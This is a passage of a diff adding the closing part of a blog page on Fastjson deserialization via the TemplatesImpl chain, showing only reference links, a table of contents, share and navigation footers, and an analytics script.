+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://paper.seebug.org/636/" target="_blank" rel="noopener">https://paper.seebug.org/636/</a><br><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a><br><a href="https://xz.aliyun.com/t/178#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/178#toc-0</a><br><a href="https://www.cnblogs.com/afanti/p/10193158.html" target="_blank" rel="noopener">https://www.cnblogs.com/afanti/p/10193158.html</a><br><a href="https://p0sec.net/index.php/archives/123/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/123/</a></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="../../../../index.html">Home</a></li>
+         
+          <li><a href="../../../../about.html">About</a></li>
+         
+          <li><a href="../../../../archives/">Writing</a></li>
+         
+          <li><a href="../../../../friends.html">Friends</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson基础知识"><span class="toc-number">1.</span> <span class="toc-text">FastJson基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl利用链"><span class="toc-number">2.1.</span> <span class="toc-text">TemplatesImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用条件"><span class="toc-number">2.1.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC分析"><span class="toc-number">2.1.3.</span> <span class="toc-text">POC分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#补丁绕过"><span class="toc-number">2.2.</span> <span class="toc-text">补丁绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接"><span class="toc-number">2.3.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&text="><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&title="><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&is_video=false&description="><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&title="><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&title="><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&title="><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&title="><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/05/23/Fastjson反序列化之TemplatesImpl调用链/&name=&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> 目录</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> 顶部</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> 菜单</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    版权所有 &copy; 2019 P0rZ9
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about.html">About</a></li><li><a href="../../../../archives/">Writing</a></li><li><a href="../../../../friends.html">Friends</a></li>
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="../../../../lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="../../../../lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="../../../../lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="../../../../lib/jquery/jquery.min.js"></script>
+<script src="../../../../lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="../../../../js/main.js"></script>
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
